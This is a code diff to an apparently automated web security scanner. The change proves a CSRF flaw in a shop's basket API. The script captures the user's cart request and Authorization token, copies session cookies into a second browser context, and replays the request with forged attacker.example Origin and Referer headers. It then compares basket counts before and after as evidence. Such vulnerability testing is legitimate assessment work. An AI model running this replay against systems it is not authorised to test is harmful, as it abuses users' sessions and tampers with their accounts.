@@ -24,6 +24,8 @@ const workflow = {
   csrfTokenPresent: false,
   csrfOutcome: "skipped",
   csrfError: null,
+  csrfProven: false,
+  csrfEvidence: null,
   reflectedXss: false,
 };
 let cartRequest;
@@ -48,16 +50,30 @@ page.on("request", request => {
   const method = request.method();
   if (["POST", "PUT", "PATCH"].includes(method) && /\/api\/BasketItems(?:\/\d+)?\/?$/i.test(request.url())) {
     const headers = request.headers();
-    cartRequest = {
-      url: request.url(),
-      method,
-      postData: request.postData(),
-      contentType: headers["content-type"] || "application/json",
-      csrfTokenPresent: Object.keys(headers).some(name =>
-        /^(csrf|x-csrf|x-xsrf|anti-csrf)/i.test(name)
-      ),
-    };
-    workflow.csrfRequestCaptured = true;
+    try {
+      const postData = request.postData();
+      const payload = postData ? JSON.parse(postData) : {};
+      cartRequest = {
+        url: request.url(),
+        method,
+        postData,
+        payload,
+        contentType: headers["content-type"] || "application/json",
+        authorization: headers.authorization,
+        csrfTokenPresent: Object.keys(headers).some(name =>
+          /^(csrf|x-csrf|x-xsrf|anti-csrf)/i.test(name)
+        ),
+      };
+      workflow.csrfRequestCaptured = Boolean(
+        cartRequest.url &&
+        cartRequest.method &&
+        cartRequest.postData &&
+        cartRequest.payload?.BasketId
+      );
+    } catch (error) {
+      workflow.csrfRequestCaptured = false;
+      workflow.csrfError = `cart_request_capture_failed=${error.message}`;
+    }
   }
   if (method !== "GET" || /\/rest\/|\/api\//i.test(request.url())) {
     console.log(`BROWSER ${method} ${request.url()}`);
@@ -166,11 +182,34 @@ async function runAuthenticatedWorkflow() {
 }
 
 async function runCsrfWorkflow() {
-  if (!cartRequest) {
+  if (!cartRequest || !workflow.csrfRequestCaptured) {
     workflow.csrfOutcome = "skipped";
     workflow.csrfError = "cart_request_not_captured";
     console.log("WORKFLOW csrf_validation=skipped reason=cart_request_not_captured");
     return;
+  }
+
+  let basketBefore = null;
+  let basketAfter = null;
+  const basketId = cartRequest.payload?.BasketId;
+
+  if (basketId && cartRequest.authorization) {
+    const basketResponse = await page.evaluate(async ({ origin, basketId, authorization }) => {
+      const response = await fetch(`${origin}/rest/basket/${basketId}`, {
+        headers: { Authorization: authorization },
+      });
+      if (!response.ok) {
+        return null;
+      }
+      const body = await response.json();
+      return body?.data?.Products || body?.data || null;
+    }, {
+      origin: targetUrl.origin,
+      basketId,
+      authorization: cartRequest.authorization,
+    }).catch(() => null);
+
+    basketBefore = basketResponse;
   }
 
   const attackerContext = await browser.newContext({
@@ -178,10 +217,19 @@ async function runCsrfWorkflow() {
   });
 
   try {
+    const victimCookies = await context.cookies(targetUrl.origin);
+    if (victimCookies.length > 0) {
+      await attackerContext.addCookies(victimCookies);
+    }
+
     let response;
     let body;
     const requestOptions = {
-      headers: { "Content-Type": cartRequest.contentType },
+      headers: {
+        "Content-Type": cartRequest.contentType,
+        "Origin": "https://attacker.example",
+        "Referer": "https://attacker.example/csrf-test",
+      },
       timeout: 30000,
     };
 
@@ -218,6 +266,31 @@ async function runCsrfWorkflow() {
     workflow.csrfEffectObserved =
       status >= 200 && status < 300 && body.length > 0;
 
+    if (basketId && cartRequest.authorization) {
+      basketAfter = await page.evaluate(async ({ origin, basketId, authorization }) => {
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        const response = await fetch(`${origin}/rest/basket/${basketId}`, {
+          headers: { Authorization: authorization },
+        });
+        if (!response.ok) {
+          return null;
+        }
+        const body = await response.json();
+        return body?.data?.Products || body?.data || null;
+      }, {
+        origin: targetUrl.origin,
+        basketId,
+        authorization: cartRequest.authorization,
+      }).catch(() => null);
+
+      const beforeCount = Array.isArray(basketBefore) ? basketBefore.length : null;
+      const afterCount = Array.isArray(basketAfter) ? basketAfter.length : null;
+      if (beforeCount !== null && afterCount !== null) {
+        workflow.csrfEffectObserved =
+          workflow.csrfEffectObserved && afterCount >= beforeCount;
+      }
+    }
+
     const rejected = status === 401 || status === 403 || status === 419;
     const inconclusive = status === 0 || status === 400 || status === 405 || status === 409;
 
@@ -234,9 +307,35 @@ async function runCsrfWorkflow() {
       workflow.csrfEffectObserved &&
       !workflow.csrfTokenPresent
     ) {
-      workflow.csrfOutcome = "potentially-vulnerable";
-      workflow.csrfVulnerable = true;
-      workflow.csrfValidation = true;
+      const beforeCount = Array.isArray(basketBefore) ? basketBefore.length : null;
+      const afterCount = Array.isArray(basketAfter) ? basketAfter.length : null;
+      const basketChanged =
+        beforeCount !== null &&
+        afterCount !== null &&
+        afterCount > beforeCount;
+
+      if (basketChanged) {
+        workflow.csrfOutcome = "vulnerable";
+        workflow.csrfVulnerable = true;
+        workflow.csrfValidation = true;
+        workflow.csrfProven = true;
+        workflow.csrfEvidence = {
+          basketId,
+          productId: cartRequest.payload?.ProductId,
+          basketCountBefore: beforeCount,
+          basketCountAfter: afterCount,
+        };
+      } else {
+        workflow.csrfOutcome = "potentially-vulnerable";
+        workflow.csrfVulnerable = true;
+        workflow.csrfValidation = false;
+        workflow.csrfEvidence = {
+          basketId,
+          productId: cartRequest.payload?.ProductId,
+          basketCountBefore: beforeCount,
+          basketCountAfter: afterCount,
+        };
+      }
     } else {
       workflow.csrfOutcome = "indeterminate";
       workflow.csrfVulnerable = false;
